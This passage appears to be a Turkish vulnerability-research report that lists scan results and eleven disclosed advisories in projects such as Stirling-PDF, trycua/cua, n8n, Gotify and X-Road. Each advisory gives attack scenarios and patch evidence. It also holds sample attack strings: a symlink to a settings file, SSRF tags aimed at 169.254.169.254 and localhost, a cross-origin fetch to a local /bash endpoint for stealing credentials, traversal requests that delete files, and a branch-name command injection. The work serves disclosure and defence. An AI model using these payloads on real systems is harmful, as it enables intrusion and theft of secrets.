| **5. `codebase-memory-mcp`** | `32` eşik aşan (`SAST 17K/7Y`, `SCA 8Y`) | **`store.c:2864` SQLi, `c_lsp.h:54` yorum, `kotlin_lsp.c`/`py_lsp.c`/`store.c:4482` boyutlu tampon, `xmalloc.c` ve `mcp.c` yanlış pozitif**; `http_server.c` `localhost` CORS + `Host` (403) korumalı | **Düşük** | **HAYIR:** `http_server.c` yabancı origin'lere CORS başlığı dönmez ve DNS rebinding'i reddeder | **DÜŞÜK** *(Yerel kod sızıntısı zinciri geçersiz)* |
| **6. `gitlab-mcp-server`** | `5` eşik aşan (`0K / 4Y`) | `recorder.go` ve `make.go` yanlış pozitif; `GITLAB_MCP_SKIP_TLS_VERIFY=true` yalnızca kullanıcı seçerse aktif | **Düşük** | **HAYIR:** Birleşen bulgu yoktur | **DÜŞÜK** *(Opsiyonel ayar)* |
| **7. `apktool-mcp`** | `16` eşik aşan (`SAST 1 Orta`, `SCA 4K / 12Y`) | SAST gizlilik uyarıları yanlış pozitif; **`uv.lock` içinde 4 kritik, 12 yüksek SCA bağımlılık kaydı var** | **Düşük / Orta (SCA)** | **HAYIR:** Doğrulanmış birinci-parti kod zinciri yoktur; bağımlılık güncellemeleri incelenmelidir | **DÜŞÜK / ORTA (SCA)** *(SAST temiz, SCA kayıtları mevcut)* |
| **8. `jadx-mcp`** | `32` eşik aşan (`SAST 3 Orta`, `SCA 6K / 26Y`) | Doğrulanmış kritik/yüksek SAST açığı yok; **`uv.lock` içinde 6 kritik, 26 yüksek SCA bağımlılık kaydı var** | **Düşük / Orta (SCA)** | **HAYIR:** Doğrulanmış birinci-parti kod zinciri yoktur; bağımlılık güncellemeleri incelenmelidir | **DÜŞÜK / ORTA (SCA)** *(SAST kritik/yüksek yok, SCA kayıtları mevcut)* |

---

## Bölüm III — Kendi Sniper Taramamızda Bulduğumuz Doğrulanmış Açıklar (11 Doğrulanmış Güvenlik Açığı, Zafiyete Dönüşüm Mekanizmaları, Senaryolar ve Örnek Çalıştırma Komutları)

**Sniper** statik/dinamik analiz motoru ile yürüttüğümüz güvenlik taramalarında tespit edilen, **Adım Adım Günlük Hayat Kritik Senaryoları (`Senaryo A / B / C`)**, **Uçtan Uca Çalışma Zamanı Kanıtları (`RED -> GREEN + BENIGN`)** ve **Doğrulanmış Savunma Yamaları (`git diff`)** ile kanıtlanan **11 güvenlik açığı** ([advisories/README.tr.md](advisories/README.tr.md)) aşağıda önce özet tablo halinde, hemen ardından ise **her bir açığın kodda nasıl oluştuğunu, adım adım nasıl zafiyete dönüştüğünü, 3 günlük hayat kritik senaryosunu ve örnek çalıştırma/doğrulama komutlarını** içeren kapsamlı teknik bölümler (`III.01` – `III.11`) halinde sunulmuştur:

| # | Açık / Advisory & GHSA Bağlantısı | Hedef Proje & Bileşen | CWE & CVSS v3.1 | Günlük Hayatta Yol Açtığı Kritik Senaryolar (`Senaryo A / B / C`) | Çalışma Zamanı Kanıtı (`RED -> GREEN`) |
| :-: | :--- | :--- | :--- | :--- | :--- |
| **01** | [`01-STIRLING-CAND-02-SYMLINK.md`](advisories/tr/01-STIRLING-CAND-02-SYMLINK.md)<br/>`GHSA-hpc7-xx5r-gc44` | **Stirling-Tools/Stirling-PDF** (`v3.2.2`)<br/>`FolderInputSource.java:337-377`<br/>`FolderOutputSink.java:338-345` | `CWE-59` / `CWE-61`<br/>**7.1 High** | **A)** Ortak SMB/NFS tarayıcı klasörüne bırakılan `invoice.pdf -> /configs/settings.yml` sembolik bağı, varsayılan `recursive=false` modunda `FolderAccessGuard` kontrolünü aşarak admin/OAuth/SMTP sırlarını çıktı klasörüne sızdırır.<br/>**B)** Otomatik SFTP/Nextcloud belge aktarım hattında bırakılan sembolik bağ üzerinden `FolderOutputSink.archiveOriginal()` konak SSH anahtarlarını veya `.env` dosyalarını arşiv klasörüne kopyalar/taşır.<br/>**C)** Çok kiracılı (multi-tenant) departman klasörlerinde bir departman, komşu departmanın özel sözleşme/maaş bordrosu dizinine sembolik bağ vererek yetkisiz belge okuma ve silme gerçekleştirir. | `RED`: `symlink_accepted: true, protected_settings_exfiltrated: true`<br/>`GREEN`: `symlink_accepted: false, regular_file_processed: true` |
| **02** | [`02-STIRLING-CAND-01-WEASYPRINT-SSRF.md`](advisories/tr/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md)<br/>`GHSA-ff6j-8xch-j8r6`<br/>*(`CVE-2026-71270` Eksik Yaması)* | **Stirling-Tools/Stirling-PDF** (`v3.2.2`)<br/>`ConvertWebsiteToPDF.java:116-143` | `CWE-918`<br/>**8.6 High** | **A)** Fatura/makbuz URL-to-PDF özelliğine verilen dış web sayfasındaki `<link rel="stylesheet" href="http://127.0.0.1:.../secrets.css">` veya `169.254.169.254` bulut IAM alt kaynağı WeasyPrint tarafından çekilip doğrudan üretilen PDF içine basılır.<br/>**B)** Java katmanındaki `SsrfProtectionService` yalnızca ana URL'yi denetlerken, WeasyPrint alt süreci `@import url("http://10.0.0.12:9090/metrics")` ile Kubernetes/Docker iç ağındaki mikroservisleri tarar.<br/>**C)** Çok aşamalı HTTP `302` yönlendirmesi kullanan bir `<img src="...">` veya `<link>` alt kaynağı ile güvenlik duvarı arkasındaki iç yönetim panellerinin yanıtları PDF olarak dışarı sızdırılır. | `RED`: `weasyprint_allowed_protocols: "data,http,https", internal_data_embedded_in_pdf: true`<br/>`GREEN`: `weasyprint_allowed_protocols: "data", internal_loopback_hit_count: 0` |
| **03** | [`03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md`](advisories/tr/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md)<br/>`GHSA-cp36-x5hg-3gg8` | **trycua/cua** (`npm: cuabot <= 1.0.16`)<br/>`libs/cuabot/src/cuabotd.ts` | `CWE-306` / `CWE-942`<br/>**9.6 Critical** | **A)** Geliştirici `npx cuabot` açıkken herhangi bir web sitesini ziyaret ettiğinde, sayfadaki JS kodu `fetch("http://localhost:7842/bash")` (`Access-Control-Allow-Origin: *`) ile komut çalıştırıp bağlanmış `~/.cuabot/user/.claude/.credentials.json` OAuth anahtarlarını çalar.<br/>**B)** Aynı çapraz kökenli `POST /bash` veya `ws://localhost:7842/?command=...` (CSWSH) üzerinden yazılabilir `/home/community-user/.claude/settings.json` dosyasına kalıcı `PreToolUse` kancası (hook) enjekte edilir.<br/>**C)** `0.0.0.0:7842` bağlaması yüzünden kafe/ofis Wi-Fi ağındaki herhangi bir cihaz parola olmadan `/bash` ve `/screenshot` uç noktalarını çağırıp geliştiricinin ekranını izler ve komut çalıştırır. | `RED`: `http_status: 200, mounted_host_claude_credentials_exfiltrated: true`<br/>`GREEN`: `http_status: 403`<br/>`BENIGN`: `http_status: 200` |
| **04** | [`04-CUA-CAND-02-WORKER-SERVER-RCE.md`](advisories/tr/04-CUA-CAND-02-WORKER-SERVER-RCE.md)<br/>`GHSA-xm8w-gj3g-4f25` | **trycua/cua** (`pip: cua-bench-rl <= 0.1.0`)<br/>`worker_server.py:79-108, 338-360`<br/>`cua_bench/core.py:25-51` | `CWE-94` / `CWE-942`<br/>**8.8 High** | **A)** RL eğitimi yapan araştırmacı tarayıcıda gezinirken ziyaret ettiği bir sayfa `http://127.0.0.1:8001/reset` (`allow_origins=["*"]`) çağrısıyla `ip_filter_middleware` kontrolünü geçer ve `spec.loader.exec_module` ile konakta keyfi `<env_path>/main.py` çalıştırır.<br/>**B)** Kubernetes/Docker Compose dağıtımında `OSGYM_ALLOWED_IPS=""` boş verildiğinde `if allowed_ips:` kontrolü fail-open olur ve `0.0.0.0:8001` tüm ağa kimlik doğrulamasız RCE açar.<br/>**C)** Ağdaki veya tarayıcıdaki saldırgan `GET /screenshot` ve `POST /step` uç noktalarını kullanarak aktif masaüstü oturumunun ekran görüntülerini toplar ve klavye/fare komutları enjekte eder. | `RED`: `cross_origin_reset_status: 200, arbitrary_env_path_exec_module_rce: true`<br/>`GREEN`: `403 / 400, rce: false`<br/>`BENIGN`: `200` |
| **05** | [`05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md`](advisories/tr/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md)<br/>`GHSA-3x8g-6h2v-8qx9` | **trycua/cua** (`cargo: cua-compat <= 0.8.0`)<br/>`daytona/objectstore.rs:320-422` | `CWE-22`<br/>**8.1 High** | **A)** Tek bir sandbox kiracısı, önceden multipart yükleme başlatmadan `DELETE /daytona/dummy?uploadId=../objects` isteği göndererek `tokio::fs::remove_dir_all` ile tüm organizasyonun `objects/` imaj deposunu tek hamlede siler.<br/>**B)** `?uploadId=../../state` veya `?uploadId=../../db` parametresiyle `d.objects.root` dışına çıkılarak `cua-spacesd` sürecinin yazma yetkisi olan konak uygulama dizinleri silinir.<br/>**C)** `PUT /daytona/key?partNumber=1&uploadId=../stage` isteğiyle çok parçalı yükleme parçaları `uploads/` dışındaki komşu uygulama dizinlerine yazılarak dosya sistemi kirletilir. | `RED`: `delete_traversal_status: 204, objects_store_wiped_without_prior_upload: true`<br/>`GREEN`: `400 / 404, objects_store_preserved: true` |
| **06** | [`06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md`](advisories/tr/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md)<br/>`GHSA-54v9-fxw3-36mm` | **trycua/cua** (`cargo: cua-media-codec <= 0.8.0`)<br/>`videotoolbox/mod.rs:308-420` | `CWE-125` / `CWE-190`<br/>**5.5 Medium** | **A)** macOS uzak masaüstü yayınında pencere/çözünürlük değişimi sırasında gelen kısa `FrameData::Nv12` dilimi sınır kontrolsüz `unsafe { std::ptr::copy_nonoverlapping }` ile okunur; bitişik heap belleğindeki `960` bayt (oturum anahtarları/sırlar) H.264 video karesine kopyalanıp izleyicilere yayınlanır.<br/>**B)** Safe Rust `VtEncoder::encode` metoduna boş veya kısa `NV12`/`BGRA` dilimi verildiğinde eşlenmemiş (unmapped) bellek okunarak `cua-spacesd` medya sunucusu `SIGSEGV` ile çöker.<br/>**C)** Bozuk `y_stride` / `uv_stride` veya `stride * (h - 1)` aritmetiği verildiğinde satır adımları tampon sınırını aşarak çok kiracılı medya sürecinde bellek bozulmasına ve servis kesintisine yol açar. | `RED`: `oob_bytes_read: 960, adjacent_heap_secret_copied_to_video_frame: true`<br/>`GREEN`: `oob_bytes_read: 0, CodecError::InvalidArgument` |
| **07** | [`07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md`](advisories/tr/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md)<br/>`GHSA-hvhg-6x47-cq96` | **trycua/cua** (`pip: cua-bench <= 0.3.1`)<br/>`winarena_adapter/cli.py:262-265`<br/>`infra/vm/setup/server/main.py` | `CWE-668` / `CWE-732`<br/>**8.6 High** | **A)** Üniversite/şirket laboratuvar ağında çalışan WinArena iş istasyonunun `0.0.0.0:8006` (şifresiz noVNC) ve `0.0.0.0:3390` (parolasız RDP) portlarına aynı LAN'daki herhangi biri bağlanıp Windows VM masaüstünü ve içindeki API anahtarlarını ele geçirir.<br/>**B)** Saldırgan ele geçirdiği VM içinden yazılabilir `-v {setup_path}:/shared` bağlamasını kullanarak konak makinedeki `winarena_adapter/infra/vm/setup` betiklerini zehirler.<br/>**C)** VM içindeki `0.0.0.0:5000` kontrol sunucusunun kimlik doğrulamasız `POST /execute_windows` (`exec()`) ve `POST /setup/launch` (`shell=True`) uç noktaları üzerinden ajan veya yerel ağ trafiğiyle rastgele işletim sistemi komutları çalıştırılır. | `RED`: `lan_exposed_ports: ["8006:8006", "3390:3389"], host_setup_dir_mounted_writable: true`<br/>`GREEN`: `lan_exposed_ports: [], host_setup_dir_mounted_writable: false` |
| **08** | [`08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md`](advisories/tr/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md)<br/>`GHSA-qwv8-hh9r-cqrf` | **openziti/ziti** (`github.com/openziti/ziti/v2`)<br/>`ziti/util/certs.go:91-103, 199-208` | `CWE-295`<br/>**7.4 High** | **A)** DevOps mühendisi Wi-Fi/VPN üzerinden `ziti edge login` çalıştırdığında, `AreCertsTrusted` -> `InsecureClient` içindeki koşulsuz `InsecureSkipVerify: true` yüzünden sahte MITM sertifikası *"Verified that server supplied certificates are trusted"* mesajıyla kabul edilir ve admin parolası saldırgana gönderilir.<br/>**B)** Otomatik CI/CD ve Kubernetes başlangıç (bootstrap) iş akışlarında `ziti edge login` sahte veya ele geçirilmiş bir Edge Controller'a güvenerek kimlik ve yönlendirici politikalarını saldırgana kaydeder.<br/>**C)** Çoklu ortam geçişlerinde süresi dolmuş, iptal edilmiş veya yanlış CA tarafından imzalanmış denetleyici sertifikaları hiçbir uyarı üretmeden güvenilir kabul edilerek sıfır-güven (Zero-Trust) PKI zinciri kırılır. | `RED`: `rogue_mitm_cert_accepted_as_trusted: true, admin_credentials_sent_to_mitm: true`<br/>`GREEN`: `x509.UnknownAuthorityError` |
| **09** | [`09-N8N-CAND-01-WEBHOOK-REDOS.md`](advisories/tr/09-N8N-CAND-01-WEBHOOK-REDOS.md)<br/>`n8n-workflow <= 2.45.0` | **n8n-io/n8n** (`npm: n8n-workflow <= 2.45.0`)<br/>`string-extensions.ts:59, 94, 326, 375, 383` | `CWE-1333`<br/>**5.3 Medium** | **A)** Halka açık iletişim/kayıt formu n8n Webhook uç noktasına (`{{$json.body.contact.isEmail()}}`) gönderilen 20 KB'lık tek bir `"a.a.a...a@!"` isteği Node.js ana olay döngüsünü ~832 ms kilitler; 10 eşzamanlı istek tüm Stripe/Slack webhook'larını ve n8n arayüzünü dondurur.<br/>**B)** Gelen destek e-postalarını veya sohbet mesajlarını ayrıştıran `{{$json.text.extractEmail()}}` otomasyon hattı, bozuk noktalı metin içeren tek bir mesajla kilitlenerek konteyner sağlık kontrolü (health-check) yeniden başlatma döngüsüne girer.<br/>**C)** CRM veri zenginleştirme iş akışlarında `{{$json.url.extractDomain()}}` (`DOMAIN_EXTRACT_REGEXP`) çalıştırıldığında uzun noktalı URL yükleri tek iş parçacıklı V8 çalışma zamanını tüketir. | `RED`: `regex_stall_ms: 165.035 (831.78ms @ 20KB), concurrent_webhook_starved: true`<br/>`GREEN`: `regex_stall_ms: 0.017 (0.0029ms)` |
| **10** | [`10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md`](advisories/tr/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md)<br/>`GHSA-cc9f-m5vr-pm75` | **gotify/server** (`v2.9.1`)<br/>`router/router.go:52-73, 93-102` | `CWE-601`<br/>**4.7 Medium** | **A)** `SSL.RedirectToHTTPS=true` açıkken sahte `Host: attacker-gotify.example.com` başlığıyla yapılan istek `HTTP/1.1 308 Permanent Redirect` ile saldırganın alan adına yönlendirilir; tarayıcı yönlendirmeyi kalıcı önbelleğe alır ve URL'deki `?token=` sızar.<br/>**B)** HTTP uç noktasına `?token=<app-token>` ile bildirim gönderen izleme betikleri (`curl -L`, Python `requests`, Uptime Kuma) `308` yönlendirmesini takip ederek uygulama anahtarını saldırganın sunucusuna teslim eder.<br/>**C)** `Host` başlığını olduğu gibi ileten bir ters vekil veya paylaşımlı önbellek arkasında çalışan Gotify sunucusunda önbellek zehirlemesi (cache poisoning) ile tüm istemciler sahte giriş sayfasına yönlendirilir. | `RED`: `status_code: 308, redirected_to_untrusted_host: true`<br/>`GREEN`: `redirected_to_untrusted_host: false, bound_to_configured_ssl_host: true` |
| **11** | [`11-XROAD-CAND-01-RUNNER-INJECTION.md`](advisories/tr/11-XROAD-CAND-01-RUNNER-INJECTION.md)<br/>`GHSA-4fcw-7xqx-fjv5` | **nordic-institute/X-Road** (`38cd99ec0ebb`)<br/>`.github/workflows/build.yaml`<br/>`_build-and-package.yml:84-91` | `CWE-78`<br/>**8.5 High** | **A)** `feat";<komut>;#` biçiminde hazırlanmış bir PR dal adı, henüz kod incelemesi veya `actions/checkout` çalışmadan kalıcı `xrd-runner-8c` self-hosted sunucusunda `_build-and-package.yml` içindeki bash betiğinde rastgele komut çalıştırır.<br/>**B)** `build.yaml` iş akışı `permissions: contents: write, packages: write` ve `secrets: inherit` ile `_build-and-package.yml`'ı çağırdığından, enjekte edilen komut GHCR paket yazma ve depo yazma yetkili `GITHUB_TOKEN`'ı ele geçirir.<br/>**C)** `xrd-runner-8c` geçici bir sanal makine değil kalıcı bir self-hosted sunucu olduğu için, saldırgan sonraki resmi X-Road sürüm derlemelerini zehirleyecek kalıcı arka plan süreci veya Gradle/Docker önbellek değişikliği bırakabilir. | `RED`: `direct_yaml_interpolation: true, arbitrary_command_executed_on_self_hosted_runner: true`<br/>`GREEN`: `env_var_parameterized: true, arbitrary_command_executed_on_self_hosted_runner: false` |

---

### III.01 — Stirling-PDF (`v3.2.2`) — İzlenen Klasör (`Watched Folder`) Sembolik Bağ (`Symlink`) Kaçışı ile `FolderAccessGuard` Atlama (`GHSA-hpc7-xx5r-gc44`, `CWE-59`/`CWE-61`, CVSS `7.1 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Stirling-Tools/Stirling-PDF` (`Maven: stirling.software:stirling-pdf`)
* **Etkilenen Sürüm & Bileşenler:** `<= v3.2.2` (`commit 684608d143779bf3a8ffc67639f077a1202c62ff`) — `FolderInputSource.java` (`listFiles`, satır `337-377`), `ProcessingFolderController.java` (satır `374-380`), `FolderOutputSink.java` (`archiveOriginal`, satır `338-345`)
* **Zafiyet Sınıfı & Skor:** `CWE-59` (Dosya Erişiminden Önce Uygunsuz Bağ Çözümlemesi) / `CWE-61` (UNIX Sembolik Bağ Takibi) — **CVSS v3.1: `7.1 High`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)
* **GitHub GHSA Bağlantısı:** `GHSA-hpc7-xx5r-gc44` (`https://github.com/Stirling-Tools/Stirling-PDF/security/advisories/GHSA-hpc7-xx5r-gc44`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/01-STIRLING-CAND-02-SYMLINK.md`](advisories/tr/01-STIRLING-CAND-02-SYMLINK.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
Stirling-PDF'in **Otomatik İşlenen Klasör (Watched Folder)** özelliği, şirketlerde ağ üzerindeki ortak bir klasöre (örneğin `/mnt/scanner-incoming`) bırakılan belgeleri otomatik olarak okuyup işleyerek çıktı klasörüne (`/mnt/scanner-processed`) kaydetmek için kullanılır. Geliştiriciler, bu özelliğin sunucunun kendi gizli ayar dosyalarını (`/configs/settings.yml` vb.) okumaması için `FolderAccessGuard.isProtected(path)` adında bir güvenlik bekçisi yazmıştır.

Ancak Java'nın standart dosya kontrol fonksiyonu olan `Files.isRegularFile(path)` çok kritik bir davranışa sahiptir: **Eğer ikinci parametre olarak `LinkOption.NOFOLLOW_LINKS` verilmezse, sembolik bağları (kısayolları / symlink) otomatik olarak takip eder** ve hedefteki dosya normal bir dosyaysa `true` döner! Buna karşılık `FolderAccessGuard.isProtected(path)` yalnızca dosyanın görünürdeki metinsel yoluna (`path.toAbsolutePath().normalize()`) bakar, gerçek hedefine (`toRealPath()`) bakmaz.

`FolderInputSource.java:337-350` içindeki zafiyetli kod tam olarak şöyledir:
```java
// app/proprietary/src/main/java/stirling/software/proprietary/policy/input/FolderInputSource.java:337-350
private static List<Path> listFiles(
        Path inputDir, boolean recursive, FolderAccessGuard accessGuard) throws IOException {
    List<Path> files = new ArrayList<>();
    if (!recursive) { // Varsayılan mod (recursive = false)
        try (Stream<Path> entries = Files.list(inputDir)) {
            entries.filter(Files::isRegularFile) // HATA 1: LinkOption.NOFOLLOW_LINKS yok! Symlink'i takip eder.
                    .filter(file -> !hidden(file))
                    // HATA 2: accessGuard.isProtected(file) ve kanonik kök kontrolü burada hiç çağrılmıyor!
                    .forEach(files::add);
        }
        return files;
    }
```
Üstelik dosya işlendikten sonra çalışan `FolderOutputSink.archiveOriginal()` (`FolderOutputSink.java:338-345`) metodu da sembolik bağın işaret ettiği hedef dosyayı kopyalayıp arşiv klasörüne taşır. Böylece ortak klasöre gerçek bir PDF yerine `invoice.pdf -> /configs/settings.yml` şeklinde bir sembolik bağ bırakan sıradan bir kullanıcı, güvenlik bekçisini tamamen atlatarak sunucunun tüm gizli ayarlarını kendi okuyabileceği çıktı klasörüne kopyalatmış olur.

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Kurumsal SMB / NFS Ofis Tarayıcı Klasöründen Yönetici Parolası ve OAuth Sırlarının Çalınması:**
  1. Bir şirket, çalışanların tarayıcıdan çıkan belgeleri otomatik OCR işlemine sokması için `/mnt/scanner-incoming` ağ paylaşımını Stirling-PDF'e varsayılan `recursive=false` modunda bağlar.
  2. Ağ paylaşımına yazma izni olan düşük yetkili bir kullanıcı veya iç ağa sızmış bir saldırgan, paylaşıma `ln -s /configs/settings.yml /mnt/scanner-incoming/fatura.pdf` sembolik bağını bırakır.
  3. Arka plan tarayıcısı `Files.isRegularFile` kontrolünden geçen bu sembolik bağı okur ve içinde `SECURITY_INITIALADMINPASSWORD`, OAuth2 `clientSecret` ve SMTP parolalarının bulunduğu `settings.yml` dosyasını herkesin okuyabildiği `/mnt/scanner-processed` çıktı klasörüne kaydeder.
* **Senaryo B — Otomatik SFTP / Nextcloud Belge Aktarım Hattında Konak SSH Anahtarlarının veya `.env` Dosyasının Arşivlenmesi:**
  1. Bir hukuk bürosu veya hastane, dış iş ortaklarından SFTP/Nextcloud ile gelen belge klasörünü Stirling-PDF'in izlenen klasörüne bağlar.
  2. Gönderilen arşiv içindeki bir sembolik bağ `/home/community-user/.ssh/id_ed25519` veya `/app/configs/custom_settings.yml` dosyasını işaret eder.
  3. `FolderOutputSink.archiveOriginal()` (`FolderOutputSink.java:338-345`) hedef dosyayı `NOFOLLOW_LINKS` olmadan kopyaladığı/taşıdığı için sunucunun özel anahtarı doğrudan dışa açık işlenmiş belgeler klasörüne düşer.
* **Senaryo C — Çok Kiracılı (Multi-Tenant) Departman Klasörleri Arasında İzolasyonun Kırılması ve `recursive=false` Yanılsaması:**
  1. Sistem yöneticisi, alt klasörlere inilmemesi ve güvenliğin sıkı olması için özellikle varsayılan `recursive: false` ayarını seçer.
  2. Oysa `recursive: true` modu `Files.walkFileTree` kullandığı için varsayılan olarak sembolik bağları takip etmezken, "daha güvenli" sanılan `recursive: false` modu `Files::isRegularFile` yüzünden sembolik bağları takip eder ve A departmanının B departmanına ait özel klasördeki sözleşmeleri kendi çıktı klasörüne çekmesine imkan tanır.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. İzole yerel test ortamında sembolik bağ kaçışını (RED) ve yamalı davranışı (GREEN) doğrulama
python3 - <<'EOF'
import os, tempfile
from pathlib import Path

with tempfile.TemporaryDirectory() as tmp:
    root = Path(tmp)
    watched = root / "watched_in"
    protected = root / "protected_configs"
    watched.mkdir(); protected.mkdir()
    secret_file = protected / "settings.yml"
    secret_file.write_text("SECURITY_INITIALADMINPASSWORD: SuperSecretAdmin123\n")
    (watched / "normal.pdf").write_text("%PDF-1.4 benign")
    os.symlink(secret_file, watched / "invoice.pdf")

    # RED (v3.2.2 varsayılan recursive=false davranışı: symlink takip edilir)
    red_files = [p.name for p in watched.iterdir() if p.is_file()]  # follow_symlinks=True
    # GREEN (Yamalı davranış: NOFOLLOW_LINKS + kanonik kök kontrolü)
    green_files = [
        p.name for p in watched.iterdir()
        if p.is_file(follow_symlinks=False) and p.resolve().is_relative_to(watched.resolve())
    ]
    print({"RED_ingested": sorted(red_files), "GREEN_ingested": sorted(green_files)})
EOF

# 2. Sniper üzerinde Stirling-PDF proje denetimini çalıştırma
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/Stirling-PDF" \
  --output-json "$HOME/audit-targets/reports/stirling-pdf-audit.json"
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "STIRLING-CAND-02": {
    "ghsa_id": "GHSA-hpc7-xx5r-gc44",
    "RED": {
      "recursive": false,
      "symlink_accepted": true,
      "protected_settings_exfiltrated": true,
      "processed_files_count": 2,
      "exfiltrated_artifact": "processed_output/report_processed.txt"
    },
    "GREEN": {
      "recursive": false,
      "symlink_accepted": false,
      "protected_settings_exfiltrated": false,
      "regular_file_processed": true,
      "processed_files_count": 1
    }
  }
}
```

---

### III.02 — Stirling-PDF (`v3.2.2`) — `CVE-2026-71270` Eksik Yaması: `ConvertWebsiteToPDF.java` (`/api/v1/convert/url/pdf`) Üzerinden WeasyPrint Alt-Kaynak SSRF ve İç Ağ Verisi Sızıntısı (`GHSA-ff6j-8xch-j8r6`, `CWE-918`, CVSS `8.6 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Stirling-Tools/Stirling-PDF` (`Maven: stirling.software:stirling-pdf`)
* **Etkilenen Sürüm & Bileşenler:** `<= v3.2.2` (`commit 684608d143779bf3a8ffc67639f077a1202c62ff`) — `ConvertWebsiteToPDF.java` (`urlToPdf`, satır `116-143`, `POST /api/v1/convert/url/pdf`)
* **Zafiyet Sınıfı & Skor:** `CWE-918` (Sunucu Taraflı İstek Sahteciliği — SSRF / `CVE-2026-71270` Eksik Yaması) — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`)
* **GitHub GHSA Bağlantısı:** `GHSA-ff6j-8xch-j8r6` (`https://github.com/Stirling-Tools/Stirling-PDF/security/advisories/GHSA-ff6j-8xch-j8r6` — `GHSA-j5rg-wh78-9f2q` / `CVE-2026-71270` varyantı)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md`](advisories/tr/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
Stirling-PDF'te daha önce HTML dosyalarını PDF'e çeviren `FileToPdf.java` bileşeninde WeasyPrint aracının iç ağdaki adreslere (`127.0.0.1`, `169.254.169.254`) bağlanabildiği bir SSRF açığı (`CVE-2026-71270`) bulunmuş ve geliştiriciler `FileToPdf.java:63-91` dosyasında HTML içeriğini `customHtmlSanitizer.sanitize()` ile temizleyip WeasyPrint'e `--allowed-protocols data` (yani HTTP/HTTPS tamamen yasak!) parametresi vererek o noktayı kapatmıştı.

**Ancak** aynı depodaki kardeş uç nokta olan `POST /api/v1/convert/url/pdf` (`ConvertWebsiteToPDF.java:116-143`) unutulmuştur! Bu uç nokta çalışma zamanında şu iki hatayı aynı anda yapar:
1. Kullanıcının verdiği dış URL'nin ana HTML metnini `fetchRemoteHtml(URL)` ile indirir ama **üzerinde `customHtmlSanitizer.sanitize()` çağırmaz**.
2. İndirdiği HTML'i PDF'e basması için WeasyPrint alt sürecini başlatırken `--allowed-protocols data,http,https` bayrağını verir!

```java
// app/core/src/main/java/stirling/software/SPDF/controller/api/converters/ConvertWebsiteToPDF.java:115-142
String htmlContent = fetchRemoteHtml(URL); // HATA 1: customHtmlSanitizer.sanitize() çağrılmıyor!
...
List<String> command = new ArrayList<>();
command.add(runtimePathConfig.getWeasyPrintPath());
command.add(tempHtmlInput.toString());
command.add("--base-url");
command.add(URL);
command.add("--pdf-forms");
command.add("--allowed-protocols");
command.add("data,http,https"); // HATA 2: WeasyPrint'in kendi başına http/https isteği atmasına izin veriliyor!
```
Bunun sonucunda saldırgan tamamen yasal görünen bir dış web sayfası (`https://ornek-site.com/fatura.html`) verir. Java katmanı `ornek-site.com` adresinin genel internette olduğunu görüp onaylar. Fakat o HTML sayfasının içinde `<link rel="stylesheet" href="http://127.0.0.1:8080/internal-secrets.css">` veya `<img src="http://169.254.169.254/latest/meta-data/...">` etiketi vardır. WeasyPrint ayrı bir Python süreci olarak çalıştığı için Java'nın `SsrfProtectionService` korumasından hiç geçmeden doğrudan `127.0.0.1` veya iç ağdaki sunuculara bağlanır ve aldığı yanıtı üretilen PDF sayfasının içine yazar!

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Fatura / Makbuz URL-to-PDF Servisinden Bulut IAM Kimlik Bilgilerinin (`169.254.169.254`) ve İç Servislerin Sızdırılması:**
  1. Bir şirket, müşterilerin veya muhasebe personelinin web üzerindeki e-makbuz bağlantılarını PDF olarak indirebilmesi için Stirling-PDF'in `/api/v1/convert/url/pdf` uç noktasını kendi uygulamasına bağlar.
  2. Saldırgan kendi kontrolündeki bir dış URL'yi gönderir; sayfanın içindeki CSS `@import` ve `<link>` etiketleri `http://127.0.0.1:8080/actuator/env` veya bulut meta veri servisini (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`) hedefler.
  3. WeasyPrint bu iç kaynakları çekip stil/içerik olarak işler ve saldırgan indirdiği PDF dosyasının içinden sunucunun iç ağ sırlarını okur.
* **Senaryo B — Java `SsrfProtectionService` DNS/IP Filtresinin WeasyPrint Alt Süreci Üzerinden Tamamen Atlanması:**
  1. Sistem yöneticisi Stirling-PDF'in SSRF korumasını aktif tutar ve doğrudan `url=http://127.0.0.1/...` isteklerinin Java katmanında engellendiğini görerek güvende olduğunu düşünür.
